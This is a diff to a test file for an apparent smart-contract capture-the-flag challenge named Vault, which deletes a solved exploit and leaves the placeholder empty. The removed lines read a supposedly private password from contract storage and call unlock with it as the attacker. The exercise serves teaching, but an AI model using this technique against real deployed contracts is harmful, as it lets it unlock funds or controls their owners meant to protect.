@@ -26,11 +26,7 @@ describe('[Challenge] Vault', function () {
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        let password = await ethers.provider.getStorageAt(this.target.address, 1);
-        console.log(`\t password: ${password}`);
-        console.log(`\t unlocking...`);
-        let unlockTX = await this.target.connect(attacker).unlock(password); await unlockTX.wait();
-        console.log(`\t Is locked: ${await this.target.locked()}`);
+        
     }).timeout(0);
 
     after(async () => {
